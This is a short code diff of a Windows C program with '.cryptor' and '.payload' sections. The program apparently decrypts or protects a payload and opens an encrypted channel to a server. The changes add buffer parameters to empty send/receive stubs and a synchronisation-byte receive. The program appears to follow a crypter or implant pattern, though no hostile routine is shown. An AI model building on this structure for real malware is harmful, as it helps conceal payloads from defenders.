@@ -15,8 +15,8 @@
  * fur the duration of the programs execution. 
  *
  */
-__attribute__((section(".payload"))) int send_secure();
-__attribute__((section(".payload"))) int recv_secure();
+__attribute__((section(".payload"))) int send_secure(BYTE*,ULONG);
+__attribute__((section(".payload"))) int recv_secure(BYTE*,ULONG);
 BYTE* SessionIV;
 BYTE* SessionKEY;
 BCRYPT_KEY_HANDLE SessionKeyHandle;
@@ -68,10 +68,6 @@ __attribute__((section(".payload"))) int payload(){
  */
 __attribute__((constructor(101), section(".cryptor"))) int construct()
 {
-	/*for (int x = 0; x < 512; x++)
-	{
-		printf ("wtf");
-	}*/
 	typedef BOOL (*CIPKIE2)(DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, DWORD dwFlag, void *pvAuxInfo, BCRYPT_KEY_HANDLE *phKey);
 	CIPKIE2 CryptImportPublicKeyInfoEx2;
 	HMODULE CryptImport = LoadLibraryA("Crypt32.dll");
@@ -476,7 +472,13 @@ __attribute__((constructor(102), section(".payload"))) int InitSecureComs(){
 	{
 		exit(-1);
 	}
-
+	/*
+	 * Recieve a syncronization byte from the server
+	 */
+	if(!recv(Connection,Syncronization,1,0))
+	{
+		exit(-1);
+	}
 	CryptMemFree(Syncronization);
 	CryptMemFree(encryptedSessionKey);
 }
@@ -498,17 +500,21 @@ __attribute__((destructor(102), section(".payload"))) int closeSecureComs(){
 
 
 }
-__attribute__((section(".payload"))) int send_secure(){
+/*
+ * this function takes a pointer to a  buffer to be sent as well as the length of the buffer.
+ * this function will return true if this function succeeds.
+ */
+__attribute__((section(".payload"))) int send_secure(BYTE* sendBuffer, ULONG bufferLen){
 
 }
-__attribute__((section(".payload"))) int recv_secure(){
+__attribute__((section(".payload"))) int recv_secure(BYTE* recvBuffer, ULONG bufferLen){
 
 }
 
 
 
 
-int main()
+int  main()
 {
 return payload();
 }
